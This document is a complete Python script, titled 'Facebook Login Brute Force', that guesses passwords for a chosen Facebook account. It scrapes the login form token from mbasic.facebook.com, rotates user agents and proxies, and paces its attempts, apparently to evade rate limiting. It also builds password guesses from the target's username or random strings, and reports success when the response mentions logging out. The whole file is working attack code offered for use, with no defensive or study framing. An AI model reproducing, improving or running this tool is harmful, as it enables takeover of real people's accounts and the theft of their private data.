# =============> Import <=============
import sys, os, requests, random, logging, time
from bs4 import BeautifulSoup
from termcolor import colored

# =============> Console Colors <=============
class CliColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# =============> Config <=============
MIN_PASSWORD_LENGTH = 6
MAIN_FB_DOMAIN = 'https://mbasic.facebook.com'
LOGIN_URL = MAIN_FB_DOMAIN + '/login.php'
DEFAULT_TIMEOUT = 2
WAIT_EVERY_N_ATTEMPTS = 100
WAIT_DURATION_SECONDS = 300  # 5 دقائق

USER_AGENTS = []
with open('user-agents.txt', 'rt', newline='', encoding='utf-8') as file:
    USER_AGENTS = file.read().splitlines()
PROXIES = []
with open('proxies.txt', 'rt', newline='', encoding='utf-8') as file:
    PROXIES = file.read().splitlines()
PAYLOAD = {}
COOKIES = {}
HEADERS = {}

# =============> Log <=============
class Log(object):
    def __init__(self, filename):
        super(Log, self).__init__()
        self.filename = filename
        self.logging = logging
        self.logging.basicConfig(format='%(asctime)s %(levelname)s: %(message)s',
                                 datefmt='%Y/%m/%d %I:%M:%S %p',
                                 filename=filename, level=self.logging.INFO)

    def write_colored(self, msg, color=''):
        if color:
            print(colored(msg, color))
        else:
            print(msg)
        self.logging.info(msg)

# =============> Functions <=============
def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'referer': LOGIN_URL,
        'content-type': 'application/x-www-form-urlencoded',
        'origin': MAIN_FB_DOMAIN
    }

def form_data(use_proxy=False):
    form = {}
    cookies = {
        'wd': '1366x663',
        'm_pixel_ratio': '1',
        'locale': 'en_US'
    }
    headers = get_random_headers()
    if use_proxy:
        random_proxy = random.choice(PROXIES)
        proxy = {'http': random_proxy}
    else:
        proxy = None

    data = requests.get(LOGIN_URL, headers=headers, proxies=proxy, timeout=DEFAULT_TIMEOUT)
    for i in data.cookies:
        cookies[i.name] = i.value

    data = BeautifulSoup(data.text, 'html.parser').form

    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']

    return form, cookies

def Login(user, password, index=1, use_proxy=False):
    global PAYLOAD, COOKIES, HEADERS
    if len(PAYLOAD) < 1 or len(COOKIES) < 1:
        PAYLOAD, COOKIES = form_data(use_proxy)
    if len(HEADERS) < 1:
        HEADERS = get_random_headers()
    if index % 2 == 0:
        PAYLOAD, COOKIES = form_data(use_proxy)
        HEADERS = get_random_headers()
    PAYLOAD['email'] = user
    PAYLOAD['pass'] = password
    random_proxy = random.choice(PROXIES)
    PROXY = {'http': random_proxy} if use_proxy else None
    r = requests.post(LOGIN_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS, proxies=PROXY, timeout=DEFAULT_TIMEOUT)
    rtext = r.text.lower()
    if 'logout' in rtext or 'log out' in rtext:
        return [True, password]
    return [False, password]

# =============> Password Generation <=============
def generate_passwords(user):
    passwords = []
    passwords.append(user + "123")
    passwords.append(user + "2024")
    passwords.append(user + "password")
    passwords.append(user + "@123")
    passwords.append("password123")
    passwords.append("123456")
    passwords.append("admin123")
    passwords.append(user.lower())
    passwords.append(user.upper())
    passwords.append(user + "admin")
    return passwords

def generate_strong_passwords(count=100):
    import string
    english_letters = string.ascii_letters
    digits = string.digits
    symbols = "!@#$%^&*()_-=+[]{}|;:,.<>?/"""
    arabic_letters = "ابتثجحخدذرزسشصضطظعغفقكلمنهوي"
    all_chars = english_letters + digits + symbols + arabic_letters
    passwords = []
    for _ in range(count):
        password = ''.join(random.choices(all_chars, k=random.randint(8, 14)))
        passwords.append(password)
    return passwords

# =============> Arguments <=============
def args():
    import argparse
    parser = argparse.ArgumentParser(description='Facebook Login Brute Force')
    parser.add_argument('-u', '--user', help='Email/Username/ID/Phone')
    parser.add_argument('-p', '--password-list', help='Password List Filename')
    parser.add_argument('-sp', '--single-password', help='Password')
    parser.add_argument('--use-proxy', action='store_true', help='Use Proxies')
    parser.add_argument('-l', '--log', help='Log Filename')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate Passwords Automatically')
    parser.add_argument('--delay', type=int, default=1, help='Delay between login attempts (in seconds)')
    parser.set_defaults(use_proxy=False)
    return parser.parse_args()

# =============> Main <=============
def main(args=None):
    print(CliColors.HEADER + """\n== Facebook Login Brute Force ==\n""")

    if args and args.single_password and args.password_list:
        print(CliColors.FAIL + "[x] You can't use single password with password list.")
        sys.exit(-2)

    log_filename = args.log if args and args.log else 'logging.log'
    _log = Log(log_filename)

    if args and args.single_password:
        passwords = [args.single_password]
    elif args and args.generate:
        passwords = []
        if args.user:
            passwords += generate_passwords(args.user)
        passwords += generate_strong_passwords(100)
    else:
        password_file = args.password_list if args and args.password_list else input(CliColors.OKBLUE + "[?] Password List Filename: \t")
        if os.path.exists(password_file):
            with open(password_file, 'rt', newline='', encoding='utf-8') as file:
                passwords = file.read().replace("\r\n", "\n").replace("\r", "\n").split("\n")
        else:
            print(CliColors.FAIL + "[x] Passwords File does not exist.")
            sys.exit(-1)

    user = args.user if args and args.user else input(CliColors.OKBLUE + "[?] Email/Username/ID/Phone: \t")
    print(CliColors.OKCYAN + "\n[*] Processing...")

    tried_passwords_file = "tried_passwords.txt"
    tried_passwords = set()
    if os.path.exists(tried_passwords_file):
        with open(tried_passwords_file, "rt", encoding="utf-8") as f:
            tried_passwords = set(f.read().splitlines())

    start_time = time.time()
    flag = [False, None]
    index = 1
    for password in passwords:
        try:
            password = password.strip()
            if password in tried_passwords:
                _log.write_colored("[!] Skipping already tried password: '{}'".format(password), 'grey')
                continue
            if len(password) < MIN_PASSWORD_LENGTH:
                _log.write_colored("[!] Password '{}' is too short.".format(password), 'grey')
                continue
            _log.write_colored("[*] Attempt #{} with user: '{}' and password: '{}'{}".format(index, user, password, ' Using Proxy' if args.use_proxy else ''), 'yellow')
            LoginOp = Login(user, password, index, args.use_proxy)
            with open(tried_passwords_file, "a", encoding="utf-8") as f:
                f.write(password + "\n")
            tried_passwords.add(password)
            if LoginOp[0]:
                flag = LoginOp
                break

            if index % WAIT_EVERY_N_ATTEMPTS == 0:
                _log.write_colored("[*] Reached {} attempts. Waiting for {} seconds...".format(index, WAIT_DURATION_SECONDS), 'cyan')
                print("waiting .......")
                time.sleep(WAIT_DURATION_SECONDS)

            time.sleep(args.delay)
        except Exception as ex:
            _log.write_colored("[!] Caught Exception: {}".format(str(ex)), 'yellow')
        index += 1

    duration = round(time.time() - start_time, 2)
    if flag[0]:
        _log.write_colored("[+] Password Found: '{}'.".format(flag[1]), 'green')
    else:
        _log.write_colored("[-] No Password was Found.", 'red')

    _log.write_colored("Took {} seconds to complete this operation.".format(duration), 'magenta')
    print("")

if __name__ == '__main__':
    sys.exit(main(args()))
